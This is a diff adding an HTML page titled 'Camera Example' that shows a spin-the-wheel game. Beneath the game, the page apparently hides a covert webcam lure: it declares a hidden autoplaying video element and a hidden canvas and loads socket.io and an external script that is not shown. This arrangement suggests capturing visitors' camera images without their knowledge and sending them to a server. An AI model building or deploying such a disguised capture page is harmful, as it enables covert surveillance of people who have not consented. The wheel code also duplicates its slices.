@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Camera Example</title>
+</head>
+
+<body>
+    <video hidden id="video" width="640" height="480" autoplay></video>
+    <canvas hidden id="canvas" width="640" height="480"></canvas>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/script.js"></script>
+
+    <div class="spin-wheel-container">
+        <div class="spin-wheel">
+            <div class="slice slice-1">1</div>
+            <div class="slice slice-2">2</div>
+            <div class="slice slice-3">3</div>
+            <div class="slice slice-4">4</div>
+            <div class="slice slice-5">5</div>
+            <div class="slice slice-6">6</div>
+        </div>
+        <button class="spin-btn">SPIN</button>
+    </div>
+
+    <style>
+        .spin-wheel-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+        }
+
+        .spin-wheel {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            transform: rotate(0deg);
+            transform-origin: center;
+        }
+
+        .slice {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-color: #fff;
+            border: 1px solid #000;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 24px;
+            line-height: 300px;
+            font-weight: bold;
+        }
+
+        .slice-1 {
+            transform: rotate(60deg);
+        }
+
+        .slice-2 {
+            transform: rotate(120deg);
+        }
+
+        .slice-3 {
+            transform: rotate(180deg);
+        }
+
+        .slice-4 {
+            transform: rotate(240deg);
+        }
+
+        .slice-5 {
+            transform: rotate(300deg);
+        }
+
+        .slice-6 {
+            transform: rotate(360deg);
+        }
+
+        .spin-btn {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            background-color: #4caf50;
+            color: #fff;
+            cursor: pointer;
+        }
+    </style>
+
+    <script>
+        const spinWheel = document.querySelector('.spin-wheel');
+        const spinBtn = document.querySelector('.spin-btn');
+
+        const sliceCount = 6; // number of slices in the wheel
+        const sliceAngle = 360 / sliceCount; // angle of each slice in degrees
+        let spinAngle = 0; // current angle of the wheel
+
+        // event listener for the spin button
+        spinBtn.addEventListener('click', () => {
+            // generate a random spin angle between 3 and 5 full rotations (1080 to 1800 degrees)
+            const randSpinAngle = spinAngle + 1080 + Math.floor(Math.random() * 721);
+
+            // rotate the wheel to the random spin angle
+            spinWheel.style.transform = `rotate(${randSpinAngle}deg)`;
+
+            // update the current spin angle
+            spinAngle = randSpinAngle % 360;
+        });
+
+        // create the wheel slices dynamically
+        for (let i = 1; i <= sliceCount; i++) {
+            const slice = document.createElement('div');
+            slice.classList.add('slice', `slice-${i}`);
+            slice.style.transform = `rotate(${(i - 1) * sliceAngle}deg)`;
+            slice.innerText = i;
+            spinWheel.appendChild(slice);
+        }
+
+    </script>
+</body>
+
+</html>
